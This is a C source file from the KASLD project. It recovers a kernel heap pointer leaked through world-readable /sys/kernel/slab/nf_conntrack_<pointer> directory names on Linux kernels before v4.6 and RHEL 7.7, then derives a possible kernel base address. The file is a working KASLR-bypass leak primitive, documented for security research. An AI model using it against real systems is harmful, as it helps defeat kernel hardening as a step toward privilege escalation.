// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve kernel pointer to `inet_net` structure from SysFS world-readable
// filename: `/sys/kernel/slab/nf_conntrack_<pointer>`.
//
// Patched in kernel v4.6~2^2~2 on 2016-05-14:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
//
// But still present in RHEL 7.7 as of 2019. Removed in RHEL 7.8 (2020).
//
// Leak primitive:
//   Data leaked:      kernel pointer to net structure (inet_net)
//   Kernel subsystem: net/netfilter — /sys/kernel/slab/ directory names
//   Data structure:   slab cache name containing raw kernel pointer
//   Address type:     virtual (kernel data)
//   Method:           exact (sysfs directory name parsing)
//   Patched:          v4.6 (commit 31b0b385f69d)
//   Status:           fixed in v4.6 (still present in RHEL 7.7)
//   Access check:     none (world-readable slab cache name in
//                     /sys/kernel/slab/)
//   Source:
//   https://elixir.bootlin.com/linux/v4.5/source/net/netfilter/nf_conntrack_core.c
//
// Mitigations:
//   Patched in v4.6 (pointer removed from slab cache name). Requires
//   CONFIG_NETFILTER=y and CONFIG_NF_CONNTRACK=y/m. /sys/kernel/slab/
//   is world-readable; no runtime sysctl can restrict access.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Before v4.6, the SLAB allocator exposed per-cache sysfs "
    "directories named /sys/kernel/slab/nf_conntrack_<pointer> where "
    "<pointer> was an unobfuscated kernel heap address. This directory "
    "was world-readable. Fixed in v4.6 by removing the pointer from "
    "the directory name.");

KASLD_META("method:exact\n"
           "phase:inference\n"
           "addr:virtual\n"
           "patch:v4.6\n"
           "config:CONFIG_NF_CONNTRACK\n");

unsigned long get_kernel_addr_conntrack() {
  unsigned long addr = 0;
  const char *path = "/sys/kernel/slab/";
  const char *needle = "nf_conntrack_";
  char d_path[256];
  char *substr;
  char *endptr;
  struct dirent *dir;
  DIR *d;

  printf("[.] trying %snf_contrack_* ...\n", path);

  d = opendir(path);
  if (d == NULL) {
    perror("[-] opendir");
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s", dir->d_name);

    substr = strstr(d_path, needle);

    if (substr == NULL)
      continue;

    addr = strtoul(&substr[strlen(needle)], &endptr, 16);

    if (addr >= KERNEL_VAS_START && addr <= KERNEL_VAS_END)
      break;

    addr = 0;
  }

  closedir(d);

  return addr;
}

int main(void) {
  /* Pre-check: can we access /sys/kernel/slab/? */
  if (access("/sys/kernel/slab/", R_OK) != 0)
    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
                                               : KASLD_EXIT_UNAVAILABLE;

  unsigned long addr = get_kernel_addr_conntrack();
  if (!addr) {
    printf("[-] no kernel address found in sysfs nf_conntrack\n");
    return 0;
  }

  /* nf_conntrack is a loadable module — the leaked struct pointer is
   * inside its module memory. Treat as a module-region leak with the
   * module name as the instance identity. */
  printf("leaked inet_net struct pointer: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_MODULE, addr, KASLD_REGION_MODULE,
               "nf_conntrack");

  return 0;
}
